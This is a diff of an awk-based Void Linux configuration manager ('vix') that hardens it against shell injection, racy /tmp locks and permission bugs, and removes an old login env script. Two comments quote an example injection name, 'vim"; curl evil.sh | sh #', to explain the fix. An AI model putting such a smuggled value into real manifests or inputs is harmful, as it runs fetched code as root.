@@ -1,7 +1,5 @@
 #!/usr/bin/awk -f
 
-MAX_GENERATIONS = 30
-
 # Функция для точного определения домашней папки (работает и с sudo, и без)
 function get_user_home(   cmd, line, home) {
     cmd = "echo $SUDO_USER"
@@ -22,22 +20,69 @@ function get_user_home(   cmd, line, home) {
     return home
 }
 
-# Функция для безопасного создания папок
+# Экранирует произвольную строку для безопасной подстановки в одинарные
+# кавычки POSIX shell. После этого результат можно вставлять в любую
+# system()-команду, независимо от содержимого строки (кавычки, $, `, ; , |,
+# переводы строк и т.д. больше не могут "вырваться" наружу и выполниться).
+# Техника стандартная: закрыть кавычку, вставить экранированную одинарную
+# кавычку, открыть кавычку заново.
+function shq(s) {
+    gsub(/'/, "'\"'\"'", s)
+    return "'" s "'"
+}
+
+# Строгая проверка "безопасного" идентификатора (имя пакета/сервиса/файла
+# репозитория/доп.папки), который приходит из ТЕКСТОВЫХ манифестов
+# (packages.vix, services.vix, repo.vix, extra.vix). Эти файлы пользователь
+# может редактировать вручную, импортировать из чужого dotfiles-репозитория
+# и т.п. - т.е. их содержимое нельзя считать полностью доверенным. Без этой
+# проверки строка из манифеста подставлялась бы в 'sudo xbps-install',
+# 'sudo cp' и т.д., и специально сформированное имя вида
+#   vim"; curl evil.sh | sh #
+# привело бы к выполнению произвольных команд ОТ ROOT. Разрешаем только
+# буквы, цифры, точку, дефис, подчёркивание и плюс - этого достаточно для
+# любых реальных имён пакетов/сервисов/файлов репозитория XBPS.
+function is_safe_name(s) {
+    return (s != "" && s !~ /^-/ && s ~ /^[A-Za-z0-9_+.-]+$/)
+}
+
+# Функция для безопасного создания папок - сразу выдаёт права на запись
+# владельцу (иначе новая папка может унаследовать ограничивающий umask/маску
+# и не даться на запись при следующем обращении).
 function mkdir_p(dir) {
-    system("mkdir -p \"" dir "\"")
+    system("mkdir -p \"" dir "\" && chmod u+rwx \"" dir "\"")
+}
+
+# Рекурсивно снимает "только чтение" (444 у файлов / 555 у папок), которое
+# специально стоит на неизменяемых слепках store/<hash> и переносится вместе
+# с содержимым при любом 'cp -a' ИЗ store в живые пути (dotfiles/,
+# packages.vix, services.vix, repo.vix, extra.vix, config.vix/<extra>/...).
+# Без этого следующие rm -rf / cp -a / запись в те же live-пути падают с
+# Permission denied у того же пользователя-владельца - это и есть причина
+# "дотфайлы не меняются при роллбеке" и общих проблем с правами в config.vix.
+function make_writable(path) {
+    system("chmod -R u+rwX \"" path "\" 2>/dev/null")
 }
 
 # Блокировка: не даёт двум процессам vix одновременно менять систему.
 # Директория lock-а создаётся атомарно (mkdir либо создаст, либо упадёт, если
 # уже есть) - в отличие от файла, это гонко-безопасно на уровне ФС.
 function acquire_lock(   pid_file, existing_pid, alive) {
-    if (system("mkdir \"" LOCKDIR "\" 2>/dev/null") != 0) {
+    if (system("mkdir " shq(LOCKDIR) " 2>/dev/null") != 0) {
         pid_file = LOCKDIR "/pid"
         existing_pid = ""
         if ((getline existing_pid < pid_file) > 0) gsub(/[ \t\r\n]/, "", existing_pid)
         close(pid_file)
 
-        alive = (existing_pid != "" && system("kill -0 " existing_pid " 2>/dev/null") == 0)
+        # existing_pid читается из файла - в норме мы сами туда пишем только
+        # PROCINFO["pid"] (число), но валидируем строго: если содержимое не
+        # чисто числовое, НЕ передаём его в system("kill -0 " existing_pid),
+        # иначе испорченный/подложенный pid-файл превращается в инъекцию
+        # команд. Считаем такую блокировку зависшей/повреждённой.
+        alive = 0
+        if (existing_pid ~ /^[0-9]+$/) {
+            alive = (system("kill -0 " existing_pid " 2>/dev/null") == 0)
+        }
 
         if (alive) {
             print "\033[31m" "Ошибка: Другой процесс vix уже выполняется (PID " existing_pid ")." "\033[0m"
@@ -45,9 +90,10 @@ function acquire_lock(   pid_file, existing_pid, alive) {
             exit 1
         }
 
-        print "Обнаружена зависшая блокировка (процесс " existing_pid " больше не активен), снимаю..."
-        system("rm -rf \"" LOCKDIR "\"")
-        if (system("mkdir \"" LOCKDIR "\" 2>/dev/null") != 0) {
+        print "Обнаружена зависшая или повреждённая блокировка, снимаю..."
+        make_writable(LOCKDIR)
+        system("rm -rf " shq(LOCKDIR))
+        if (system("mkdir " shq(LOCKDIR) " 2>/dev/null") != 0) {
             print "\033[31m" "Ошибка: Не удалось захватить блокировку " LOCKDIR "\033[0m"
             exit 1
         }
@@ -59,7 +105,7 @@ function acquire_lock(   pid_file, existing_pid, alive) {
 
 function release_lock() {
     if (LOCK_ACQUIRED) {
-        system("rm -rf \"" LOCKDIR "\"")
+        system("rm -rf " shq(LOCKDIR))
         LOCK_ACQUIRED = 0
     }
 }
@@ -67,12 +113,14 @@ function release_lock() {
 # Оставляет только MAX_GENERATIONS последних (по времени) поколений в store/.
 # Текущее поколение (store/current) никогда не удаляется, даже если оно
 # старше остальных - например, сразу после rollback на старый снапшот.
-function prune_old_generations(   gens_cmd, gdir, gen_count, i, cur_dir, readlink_cmd, removed, plist) {
+function prune_old_generations(   gens_cmd, gdir, gen_count, i, cur_dir, readlink_cmd, plist, oldest_i) {
     gens_cmd = "find \"" VOID_STORE "\" -mindepth 1 -maxdepth 1 -type d ! -name current -print0 2>/dev/null | xargs -0r ls -td 2>/dev/null"
     gen_count = 0
     while ((gens_cmd | getline gdir) > 0) plist[++gen_count] = gdir
     close(gens_cmd)
 
+    # Чёткое ограничение: пока поколений не больше MAX_GENERATIONS - ничего
+    # не удаляется вообще.
     if (gen_count <= MAX_GENERATIONS) return
 
     cur_dir = ""
@@ -80,23 +128,26 @@ function prune_old_generations(   gens_cmd, gdir, gen_count, i, cur_dir, readlin
     if ((readlink_cmd | getline cur_dir) > 0) gsub(/[ \t\r\n]/, "", cur_dir)
     close(readlink_cmd)
 
-    removed = 0
-    for (i = 1; i <= gen_count; i++) {
-        if (i <= MAX_GENERATIONS) continue
+    # plist отсортирован по убыванию mtime (новые первые). Идём с хвоста
+    # (самое старое) к началу и удаляем ОДНО самое старое поколение, которое
+    # не является текущим - не больше и не меньше одного за вызов.
+    oldest_i = 0
+    for (i = gen_count; i >= 1; i--) {
         if (plist[i] == cur_dir) continue
-        system("chmod -R u+w \"" plist[i] "\" 2>/dev/null")
-        system("rm -rf \"" plist[i] "\"")
-        removed++
+        oldest_i = i
+        break
     }
-    if (removed > 0) {
-        print "-> Сборка мусора: удалено старых поколений: " removed " (лимит хранения: " MAX_GENERATIONS ")"
-    }
+    if (oldest_i == 0) return
+
+    make_writable(plist[oldest_i])
+    system("rm -rf \"" plist[oldest_i] "\"")
+    print "-> Сборка мусора: удалено ровно одно (самое старое) поколение из-за превышения лимита хранения (" MAX_GENERATIONS ")"
 }
 
 # Хэш содержимого папки (рекурсивно, пути относительные - не зависят от расположения папки)
 function get_dir_hash(dir,    cmd, h) {
-    if (system("[ -d \"" dir "\" ]") != 0) return ""
-    cmd = "(cd \"" dir "\" 2>/dev/null && find . -type f -print0 | sort -z | xargs -0 sha256sum 2>/dev/null) | sha256sum | cut -d' ' -f1"
+    if (system("[ -d " shq(dir) " ]") != 0) return ""
+    cmd = "(cd " shq(dir) " 2>/dev/null && find . -type f -print0 | sort -z | xargs -0 sha256sum 2>/dev/null) | sha256sum | cut -d' ' -f1"
     h = ""
     if ((cmd | getline h) > 0) gsub(/[ \t\r\n]/, "", h)
     close(cmd)
@@ -105,8 +156,8 @@ function get_dir_hash(dir,    cmd, h) {
 
 # Хэш одного файла
 function get_file_hash(file,    cmd, h) {
-    if (system("[ -f \"" file "\" ]") != 0) return ""
-    cmd = "sha256sum \"" file "\" 2>/dev/null | cut -d' ' -f1"
+    if (system("[ -f " shq(file) " ]") != 0) return ""
+    cmd = "sha256sum " shq(file) " 2>/dev/null | cut -d' ' -f1"
     h = ""
     if ((cmd | getline h) > 0) gsub(/[ \t\r\n]/, "", h)
     close(cmd)
@@ -120,7 +171,7 @@ function get_file_hash(file,    cmd, h) {
 # другим путём тоже считается изменением.
 function get_extra_combined_hash(is_store,   ef, name, ex_path, eq, line_, h, dpath, any, tmp_file, mktemp_cmd, hash_cmd, result) {
     ef = is_store ? (last_store_dir "/extra.vix") : EXTRA_FILE
-    if (system("[ -f \"" ef "\" ]") != 0) return ""
+    if (system("[ -f " shq(ef) " ]") != 0) return ""
 
     tmp_file = ""
     mktemp_cmd = "mktemp /tmp/vix_extra_buf.XXXXXX 2>/dev/null"
@@ -134,6 +185,7 @@ function get_extra_combined_hash(is_store,   ef, name, ex_path, eq, line_, h, dp
         eq = index(line_, "=")
         if (eq <= 0) continue
         name = substr(line_, 1, eq-1)
+        if (!is_safe_name(name)) continue
         ex_path = substr(line_, eq+1)
         dpath = is_store ? (last_store_dir "/extra/" name) : (VOID_CONFIG "/" name)
         h = get_dir_hash(dpath)
@@ -192,7 +244,7 @@ function generate_packages_config(target_file,    xbps_cmd, pkg, i, count, sorte
     xbps_cmd = "xbps-query -l | awk '{print $2}'" 
     while ((xbps_cmd | getline pkg) > 0) {
         pkg = clean_package_name(pkg)
-        if (pkg != "") sorted_pkgs[++count] = pkg
+        if (pkg != "" && is_safe_name(pkg)) sorted_pkgs[++count] = pkg
     }
     close(xbps_cmd)
     
@@ -215,9 +267,9 @@ function generate_services_config(target_file,    sv_cmd, service, active_count,
     sv_cmd = "find /etc/sv -maxdepth 1 -mindepth 1 -type d"
     while ((sv_cmd | getline service) > 0) {
         sub(".*/", "", service)
-        if (service == "") continue
+        if (service == "" || !is_safe_name(service)) continue
         
-        if (system("[ -L \"/var/service/" service "\" ]") == 0) {
+        if (system("[ -L /var/service/" shq(service) " ]") == 0) {
             active_list[++active_count] = service
         } else {
             inactive_list[++inactive_count] = service
@@ -232,7 +284,7 @@ function generate_services_config(target_file,    sv_cmd, service, active_count,
     
     print "# var/service" >> target_file
     for (i = 1; i <= active_count; i++) {
-        if (system("[ -f \"/etc/sv/" active_list[i] "/down\" ]") == 0) {
+        if (system("[ -f /etc/sv/" shq(active_list[i]) "/down ]") == 0) {
             print active_list[i] " = false" >> target_file
         } else {
             print active_list[i] " = true" >> target_file
@@ -272,16 +324,17 @@ function serialize_repo_all(target_file) {
 
 # Сравнивает временный буфер с реальным файлом в системе и при расхождении
 # копирует (через sudo). Возвращает 1, если было изменение.
-function repo_flush(target_sys_dir, current_file, tmp_file,    changed) {
+function repo_flush(target_sys_dir, current_file, tmp_file,    changed, dest) {
     if (current_file == "" || tmp_file == "") return 0
     close(tmp_file)
     changed = 0
-    if (system("cmp -s \"" tmp_file "\" \"" target_sys_dir "/" current_file "\"") != 0) {
-        print "  [!] Изменение -> Обновляю репозиторий: " target_sys_dir "/" current_file
-        system("sudo cp -f \"" tmp_file "\" \"" target_sys_dir "/" current_file "\"")
+    dest = target_sys_dir "/" current_file
+    if (system("cmp -s " shq(tmp_file) " " shq(dest)) != 0) {
+        print "  [!] Изменение -> Обновляю репозиторий: " dest
+        system("sudo cp -f " shq(tmp_file) " " shq(dest))
         changed = 1
     }
-    system("rm -f \"" tmp_file "\"")
+    system("rm -f " shq(tmp_file))
     return changed
 }
 
@@ -300,13 +353,25 @@ function deserialize_repo_all(flat_file,    target_sys_dir, current_file, tmp_fi
             if (repo_flush(target_sys_dir, current_file, tmp_file)) global_changed = 1
             current_file = ""; tmp_file = ""
             target_sys_dir = (line == "#usr/share/xbps.d") ? "/usr/share/xbps.d" : "/etc/xbps.d"
-            system("sudo mkdir -p \"" target_sys_dir "\"")
+            system("sudo mkdir -p " shq(target_sys_dir))
             continue
         }
         if (line == "") continue
         if (line ~ /^@@FILE:/) {
             if (repo_flush(target_sys_dir, current_file, tmp_file)) global_changed = 1
             sub(/^@@FILE:/, "", line)
+
+            # КРИТИЧНО: имя файла приходит из repo.vix (обычный текстовый
+            # манифест - не полностью доверенный ввод). Раньше оно
+            # подставлялось напрямую в 'sudo cp'/'cmp' - имя вида
+            #   foo"; curl evil.sh | sh #
+            # выполнило бы произвольные команды ОТ ROOT. Валидируем строгим
+            # allowlist-ом (без '/', без '..') прежде чем использовать.
+            if (!is_safe_name(line)) {
+                print "\033[31m" "  [!] Небезопасное/некорректное имя файла в repo.vix пропущено: " line "\033[0m"
+                current_file = ""; tmp_file = ""
+                continue
+            }
             current_file = line
 
             # Небезопасно использовать предсказуемое имя в /tmp вместе с sudo cp
@@ -315,7 +380,14 @@ function deserialize_repo_all(flat_file,    target_sys_dir, current_file, tmp_fi
             mktemp_cmd = "mktemp /tmp/vix_repo_buf.XXXXXX 2>/dev/null"
             if ((mktemp_cmd | getline tmp_file) > 0) gsub(/[ \t\r\n]/, "", tmp_file)
             close(mktemp_cmd)
-            if (tmp_file == "") tmp_file = "/tmp/vix_repo_buf." PROCINFO["pid"] "." current_file
+            if (tmp_file == "") {
+                # mktemp не сработал - лучше пропустить файл, чем использовать
+                # предсказуемый путь в /tmp (риск symlink-атаки от другого
+                # локального пользователя перед 'sudo cp').
+                print "\033[31m" "  [!] Не удалось создать временный файл (mktemp) для " current_file ", пропускаю." "\033[0m"
+                current_file = ""
+                continue
+            }
 
             printf "" > tmp_file
             close(tmp_file)
@@ -332,54 +404,66 @@ function deserialize_repo_all(flat_file,    target_sys_dir, current_file, tmp_fi
     return global_changed
 }
 
-# Подключает строку 'marker' в профильный файл pf (идемпотентно - не дублирует
-# при повторных запусках). create_if_missing=1 - создать файл, если его нет
-# (используется для ~/.profile, читаемого большинством shell по умолчанию).
-function ensure_profile_sources(pf, marker, create_if_missing) {
-    if (system("[ -f \"" pf "\" ]") != 0) {
-        if (!create_if_missing) return
-        system("touch \"" pf "\"")
+# УБРАНО НАВСЕГДА: раньше здесь генерировался config.vix/vix_env.sh, который
+# на каждый логин переключал XDG_CONFIG_HOME на store/current/dotfiles и
+# ПЕРЕПИСЫВАЛ дотфайлы в $HOME файлами-заглушками вида "source .../dotfiles/.bashrc".
+# Это создавало разрушительный цикл: заглушка попадала в $HOME, а следующий
+# 'vix sync' импортировал уже эту заглушку обратно в config.vix/dotfiles,
+# БЕЗВОЗВРАТНО затирая настоящее содержимое дотфайла. Плюс модификация
+# ~/.profile/~/.bash_profile/~/.zprofile ломала графические сессии (в т.ч.
+# провоцировала "Invalid MIT-MAGIC-COOKIE-1 key / Can't open display" у sxhkd,
+# запускаемого через такие профильные файлы). Дотфайлы и так физически
+# копируются в $HOME на Шаге Б 'vix switch' - отдельный env-скрипт не нужен,
+# полноценный откат делает 'vix rollback' (vix r), откат через загрузчик не
+# требуется.
+#
+# Функция ниже лечит уже существующие системы: удаляет vix_env.sh, если он
+# остался с прошлых версий, и вычищает добавленные им строки из профильных
+# файлов, чтобы больше ничего не переписывало дотфайлы на логине.
+function cleanup_env_script_remnants(home,    marker, pfile, tmp) {
+    marker = home "/config.vix/vix_env.sh"
+
+    if (system("[ -f \"" marker "\" ]") == 0) {
+        print "-> Обнаружен устаревший vix_env.sh - удаляю (больше не используется, ломал дотфайлы и X-сессию)."
+        system("rm -f \"" marker "\"")
     }
-    if (system("grep -qF '" marker "' \"" pf "\" 2>/dev/null") != 0) {
-        print "" >> pf
-        print "# VIX: выбор поколения дотфайлов (добавлено автоматически)" >> pf
-        print marker >> pf
-        close(pf)
+
+    pfile = home "/.profile"; tmp = pfile ".vix_clean_tmp"
+    if (system("[ -f \"" pfile "\" ] && grep -qF \"" marker "\" \"" pfile "\" 2>/dev/null") == 0) {
+        system("grep -vF \"" marker "\" \"" pfile "\" | grep -v '^# VIX: выбор поколения дотфайлов' > \"" tmp "\" && mv \"" tmp "\" \"" pfile "\"")
+        print "-> Убрано автоподключение vix_env.sh из ~/.profile"
     }
-}
 
-# Пишет скрипт окружения прямо в config.vix/ (не требует root, т.к. это
-# папка пользователя) и подключает его через ~/.profile / ~/.bash_profile /
-# ~/.zprofile - без /etc/profile.d и без sudo.
-function write_env_script(home,    pfile, marker) {
-    pfile = home "/config.vix/vix_env.sh"
+    pfile = home "/.bash_profile"; tmp = pfile ".vix_clean_tmp"
+    if (system("[ -f \"" pfile "\" ] && grep -qF \"" marker "\" \"" pfile "\" 2>/dev/null") == 0) {
+        system("grep -vF \"" marker "\" \"" pfile "\" | grep -v '^# VIX: выбор поколения дотфайлов' > \"" tmp "\" && mv \"" tmp "\" \"" pfile "\"")
+        print "-> Убрано автоподключение vix_env.sh из ~/.bash_profile"
+    }
 
-    print "#!/bin/sh" > pfile
-    print "# Универсальный выбор XDG_CONFIG_HOME по симлинку текущего поколения VIX" >> pfile
-    print "# (не зависит от загрузчика - работает одинаково с GRUB, rEFInd, systemd-boot и т.д.)" >> pfile
-    print "VIX_CURRENT=\"" home "/config.vix/store/current/dotfiles\"" >> pfile
-    print "if [ -d \"$VIX_CURRENT\" ]; then" >> pfile
-    print "    export XDG_CONFIG_HOME=\"$VIX_CURRENT\"" >> pfile
-    print "    find \"$XDG_CONFIG_HOME\" -maxdepth 1 -type f -name '.*' | while IFS= read -r f; do" >> pfile
-    print "        echo \"source $f\" > \"" home "/$(basename $f)\"" >> pfile
-    print "        chmod +x \"" home "/$(basename $f)\"" >> pfile
-    print "    done" >> pfile
-    print "else" >> pfile
-    print "    export XDG_CONFIG_HOME=\"" home "/config.vix/dotfiles\"" >> pfile
-    print "fi" >> pfile
-    close(pfile)
-    system("chmod +x \"" pfile "\"")
-
-    marker = ". \"" pfile "\""
-    ensure_profile_sources(home "/.profile", marker, 1)
-    ensure_profile_sources(home "/.bash_profile", marker, 0)
-    ensure_profile_sources(home "/.zprofile", marker, 0)
-
-    print "Скрипт окружения обновлён: " pfile " (подключён через ~/.profile)"
+    pfile = home "/.zprofile"; tmp = pfile ".vix_clean_tmp"
+    if (system("[ -f \"" pfile "\" ] && grep -qF \"" marker "\" \"" pfile "\" 2>/dev/null") == 0) {
+        system("grep -vF \"" marker "\" \"" pfile "\" | grep -v '^# VIX: выбор поколения дотфайлов' > \"" tmp "\" && mv \"" tmp "\" \"" pfile "\"")
+        print "-> Убрано автоподключение vix_env.sh из ~/.zprofile"
+    }
 }
 
 BEGIN {
     USER_HOME = get_user_home()
+
+    # Устойчивый идентификатор текущей машины. Используется, чтобы отличить
+    # "манифест не менялся с прошлого switch НА ЭТОЙ ЖЕ машине" от "config.vix
+    # целиком перенесён/склонирован на другую машину" - во втором случае
+    # реального состояния системы, соответствующего манифестам, ещё нет, и
+    # пропускать шаги применения (пакеты/сервисы/репозитории/дотфайлы) по
+    # одному лишь совпадению хэшей манифестов небезопасно.
+    MACHINE_ID = ""
+    if ((getline MACHINE_ID < "/etc/machine-id") <= 0) {
+        mid_cmd = "hostname 2>/dev/null"
+        mid_cmd | getline MACHINE_ID
+        close(mid_cmd)
+    }
+    close("/etc/machine-id")
+    gsub(/[ \t\r\n]/, "", MACHINE_ID)
 
     cmd = ARGV[1]
     known_cmd = (cmd == "switch" || cmd == "s" || \
@@ -407,17 +491,27 @@ BEGIN {
     # 'vix add' не даст добавить папку с таким именем.
     RESERVED_NAMES = "|dotfiles|store|packages.vix|services.vix|repo.vix|extra.vix|packages.vix.tmp|services.vix.tmp|"
 
-    # Сколько последних поколений хранить в store/ (сборка мусора после switch)
-    #MAX_GENERATIONS = 30
+    # Сколько последних поколений хранить в store/ (сборка мусора после switch).
+    # ВАЖНО: раньше эта переменная задавалась строкой верхнего уровня ДО BEGIN,
+    # что в awk означает "паттерн для основного цикла по записям файлов", а не
+    # инициализацию - а основной цикл никогда не запускался, т.к. BEGIN всегда
+    # завершается через exit. Из-за этого MAX_GENERATIONS фактически был
+    # всегда пустым (0), и сборка мусора удаляла ВСЕ старые поколения вместо
+    # ограничения по лимиту. Теперь значение задаётся здесь, внутри BEGIN.
+    MAX_GENERATIONS = 30
 
     # Блокировка - только для команд, которые реально меняют систему/конфиг.
-    # Ключ блокировки привязан к домашней папке пользователя (не к config.vix,
-    # т.к. для первого 'vix sync' этой папки ещё не существует на момент захвата).
+    # ВАЖНО: раньше блокировка лежала в /tmp по предсказуемому имени
+    # (/tmp/.vix-lock-<home>). /tmp обычно доступен на запись всем локальным
+    # пользователям (режим 1777) - значит, ДРУГОЙ пользователь мог заранее
+    # создать такую папку с произвольным содержимым pid-файла и либо
+    # заблокировать vix (DoS), либо (до фикса validation в acquire_lock)
+    # добиться выполнения произвольной команды через "kill -0 $pid". Теперь
+    # блокировка живёт внутри домашней папки самого пользователя, куда у
+    # посторонних нет доступа на запись.
     if (cmd == "switch" || cmd == "s" || \
         cmd == "sync" || cmd == "rollback" || cmd == "r" || cmd == "add" || cmd == "a") {
-        safe_user = USER_HOME
-        gsub(/[^a-zA-Z0-9]/, "_", safe_user)
-        LOCKDIR = "/tmp/.vix-lock-" safe_user
+        LOCKDIR = USER_HOME "/.vix.lock"
         acquire_lock()
     }
     
@@ -452,11 +546,19 @@ BEGIN {
         cmd_user = "echo $SUDO_USER"
         if ((cmd_user | getline real_user) > 0 && real_user != "") {
             gsub(/[ \t\r\n]/, "", real_user)
-            system("chown -R " real_user ":" real_user " \"" VOID_CONFIG "\"")
+            if (real_user ~ /^[A-Za-z0-9_.-]+$/) {
+                system("chown -R " real_user ":" real_user " " shq(VOID_CONFIG))
+            }
         }
         close(cmd_user)
 
-        write_env_script(USER_HOME)
+        cleanup_env_script_remnants(USER_HOME)
+
+        # Гарантируем права на запись для всего config.vix сразу после
+        # синхронизации - на случай, если что-то раньше стало read-only
+        # (например, после отката) или было импортировано из источника с
+        # ограничивающими правами.
+        make_writable(VOID_CONFIG)
 
         print "Синхронизация завершена успешно!"
         print "-> Слепок не создаётся и /store не трогается. Чтобы применить это к системе, выполните 'vix switch'."
@@ -478,11 +580,11 @@ BEGIN {
         }
 
         # Разворачиваем в канонический абсолютный путь (раскрывает ~, симлинки, ..)
-        resolve_cmd = "readlink -f \"" add_arg "\" 2>/dev/null"
+        resolve_cmd = "readlink -f " shq(add_arg) " 2>/dev/null"
         add_path = ""
         if ((resolve_cmd | getline add_path) > 0) gsub(/[ \t\r\n]/, "", add_path)
         close(resolve_cmd)
-        if (add_path == "" || system("[ -d \"" add_path "\" ]") != 0) {
+        if (add_path == "" || system("[ -d " shq(add_path) " ]") != 0) {
             print "\033[31m" "Ошибка: '" add_arg "' не найден или не является папкой." "\033[0m"
             exit 1
         }
@@ -497,8 +599,13 @@ BEGIN {
             print "\033[31m" "Ошибка: Имя '" add_name "' зарезервировано под служебные файлы VIX, выберите другую папку." "\033[0m"
             exit 1
         }
-        if (add_name ~ /=/) {
-            print "\033[31m" "Ошибка: Имя папки не должно содержать символ '='." "\033[0m"
+        # Имя папки попадёт в extra.vix и будет подставляться в системные
+        # команды при каждом последующем switch/rollback - ограничиваем
+        # безопасным набором символов, чтобы никакое содержимое имени не
+        # могло быть интерпретировано shell'ом.
+        if (!is_safe_name(add_name)) {
+            print "\033[31m" "Ошибка: Имя папки '" add_name "' содержит недопустимые символы." "\033[0m"
+            print "Разрешены только буквы, цифры, '.', '_', '+', '-' (и не может начинаться с '-')."
             exit 1
         }
 
@@ -513,16 +620,18 @@ BEGIN {
             close(EXTRA_FILE)
         }
 
-        if (!already_registered && system("[ -e \"" add_dest "\" ]") == 0) {
+        if (!already_registered && system("[ -e " shq(add_dest) " ]") == 0) {
             print "\033[31m" "Ошибка: config.vix/" add_name " уже существует и не зарегистрирована через 'vix add'." "\033[0m"
             print "Переименуйте исходную папку или уберите конфликт вручную."
             exit 1
         }
 
         print "-> Импортирую " add_path " -> config.vix/" add_name " ..."
+        make_writable(add_dest)
         mkdir_p(add_dest)
-        system("find \"" add_dest "\" -mindepth 1 -maxdepth 1 -exec rm -rf {} +")
-        system("cp -a \"" add_path "\"/. \"" add_dest "\"/ 2>/dev/null")
+        system("find " shq(add_dest) " -mindepth 1 -maxdepth 1 -exec rm -rf {} +")
+        system("cp -a " shq(add_path) "/. " shq(add_dest) "/ 2>/dev/null")
+        make_writable(add_dest)
 
         # Перезаписываем строку реестра (на случай повторного add с тем же именем)
         add_tmp = ""
@@ -542,13 +651,15 @@ BEGIN {
         }
         print add_name "=" add_path >> add_tmp
         close(add_tmp)
-        system("mv \"" add_tmp "\" \"" EXTRA_FILE "\"")
+        system("mv " shq(add_tmp) " " shq(EXTRA_FILE))
 
         cmd_user = "echo $SUDO_USER"
         if ((cmd_user | getline real_user) > 0 && real_user != "") {
             gsub(/[ \t\r\n]/, "", real_user)
-            system("chown -R " real_user ":" real_user " \"" add_dest "\"")
-            system("chown " real_user ":" real_user " \"" EXTRA_FILE "\"")
+            if (real_user ~ /^[A-Za-z0-9_.-]+$/) {
+                system("chown -R " real_user ":" real_user " " shq(add_dest))
+                system("chown " real_user ":" real_user " " shq(EXTRA_FILE))
+            }
         }
         close(cmd_user)
 
@@ -676,17 +787,32 @@ BEGIN {
         print "-> Восстанавливаю манифесты (дотфайлы, пакеты, сервисы, репозитории) из слепка..."
 
         if (system("[ -d \"" target_dir "/dotfiles\" ]") == 0) {
+            # Слепок в store/ - неизменяемый (444/555). Перед удалением/записью
+            # в живую DOTFILES обязательно снимаем read-only, иначе rm -rf не
+            # сможет очистить вложенные файлы (Permission denied), и дотфайлы
+            # "не меняются" - именно так проявлялся этот баг.
+            make_writable(DOTFILES)
             system("find \"" DOTFILES "\" -mindepth 1 -maxdepth 1 -exec rm -rf {} +")
             system("cp -a \"" target_dir "\"/dotfiles/. \"" DOTFILES "\"/ 2>/dev/null")
+            # cp -a переносит режим 444/555 из store вместе с содержимым -
+            # сразу возвращаем права на запись, чтобы следующий switch/sync/
+            # rollback не упёрся в ту же проблему.
+            make_writable(DOTFILES)
         }
         if (system("[ -f \"" target_dir "/packages.vix\" ]") == 0) {
+            system("rm -f \"" PKG_FILE "\"")
             system("cp -a \"" target_dir "/packages.vix\" \"" PKG_FILE "\"")
+            make_writable(PKG_FILE)
         }
         if (system("[ -f \"" target_dir "/services.vix\" ]") == 0) {
+            system("rm -f \"" SVC_FILE "\"")
             system("cp -a \"" target_dir "/services.vix\" \"" SVC_FILE "\"")
+            make_writable(SVC_FILE)
         }
         if (system("[ -f \"" target_dir "/repo.vix\" ]") == 0) {
+            system("rm -f \"" REPO_FILE "\"")
             system("cp -a \"" target_dir "/repo.vix\" \"" REPO_FILE "\"")
+            make_writable(REPO_FILE)
         }
 
         # Папки, добавленные через 'vix add' - восстанавливаем реестр extra.vix
@@ -694,17 +820,24 @@ BEGIN {
         system("rm -f \"" EXTRA_FILE "\"")
         if (system("[ -f \"" target_dir "/extra.vix\" ]") == 0) {
             system("cp -a \"" target_dir "/extra.vix\" \"" EXTRA_FILE "\"")
+            make_writable(EXTRA_FILE)
             while ((getline rb_line < EXTRA_FILE) > 0) {
                 if (rb_line == "") continue
                 rb_eq = index(rb_line, "=")
                 if (rb_eq <= 0) continue
                 rb_name = substr(rb_line, 1, rb_eq-1)
+                if (!is_safe_name(rb_name)) {
+                    print "\033[31m" "  [!] Небезопасное/некорректное имя папки в extra.vix пропущено: " rb_name "\033[0m"
+                    continue
+                }
                 rb_src = target_dir "/extra/" rb_name
-                if (system("[ -d \"" rb_src "\" ]") == 0) {
+                if (system("[ -d " shq(rb_src) " ]") == 0) {
                     rb_dst = VOID_CONFIG "/" rb_name
-                    system("rm -rf \"" rb_dst "\"")
+                    make_writable(rb_dst)
+                    system("rm -rf " shq(rb_dst))
                     mkdir_p(rb_dst)
-                    system("cp -a \"" rb_src "\"/. \"" rb_dst "\"/ 2>/dev/null")
+                    system("cp -a " shq(rb_src) "/. " shq(rb_dst) "/ 2>/dev/null")
+                    make_writable(rb_dst)
                 }
             }
             close(EXTRA_FILE)
@@ -755,6 +888,32 @@ BEGIN {
 
         if (last_store_dir == "") {
             print "  -> Предыдущих поколений не найдено. Требуется полная синхронизация."
+        } else {
+            snapshot_machine_id = ""
+            if ((getline snapshot_machine_id < (last_store_dir "/.machine_id")) > 0) {
+                gsub(/[ \t\r\n]/, "", snapshot_machine_id)
+            }
+            close(last_store_dir "/.machine_id")
+
+            if (snapshot_machine_id == "" || snapshot_machine_id != MACHINE_ID) {
+                # Слепок либо создан до появления метки машины (обновление
+                # vix), либо (что важнее) config.vix был целиком перенесён с
+                # другой машины - например, склонирован из git при первичной
+                # настройке. В обоих случаях реальное состояние ЭТОЙ системы
+                # не обязано соответствовать манифестам из последнего слепка,
+                # даже если сами манифесты побайтово совпадают. Поэтому
+                # намеренно не доверяем сравнению хэшей и форсируем полную
+                # синхронизацию (один раз - следующий switch на этой же
+                # машине снова будет использовать быстрый путь).
+                last_store_dir = ""
+                print "  -> Последнее поколение принадлежит другой машине (или создано старой версией vix)."
+                print "  -> Пропускать шаги по совпадению манифестов небезопасно - требуется полная синхронизация."
+            }
+        }
+
+        if (last_store_dir == "") {
+            # Сообщение о полной синхронизации уже выведено выше (либо это
+            # действительно первый switch, либо машина/версия не совпала).
         } else {
             print "  -> Сравниваю с поколением: " last_store_dir
 
@@ -833,8 +992,19 @@ BEGIN {
             
             if (system("cmp -s \"" dotfile "\" \"" target_file "\"") != 0) {
                 print "  -> Изменение обнаружено! Обновление дотфайла: " filename
-                system("cp -f \"" dotfile "\" \"" target_file "\"")
-                system("chmod +x \"" target_file "\"")
+                # На случай, если target_file уже существует и когда-то стал
+                # read-only (например, унаследовал права от store) - иначе
+                # cp -f молча не сможет перезаписать содержимое.
+                system("chmod u+w \"" target_file "\" 2>/dev/null")
+                if (system("cp -f \"" dotfile "\" \"" target_file "\"") != 0) {
+                    print "\033[31m" "  [!] Не удалось записать " target_file " (ошибка компонента 'дотфайлы')." "\033[0m"
+                    print "  -> Делаю sync именно этого файла: возвращаю манифест в соответствие текущему рабочему состоянию системы."
+                    system("cp -a \"" target_file "\" \"" dotfile "\" 2>/dev/null")
+                    make_writable(dotfile)
+                    PIPELINE_HAD_ERRORS = 1
+                } else {
+                    system("chmod u+wx \"" target_file "\"")
+                }
             }
         }
         close(ln_cmd)
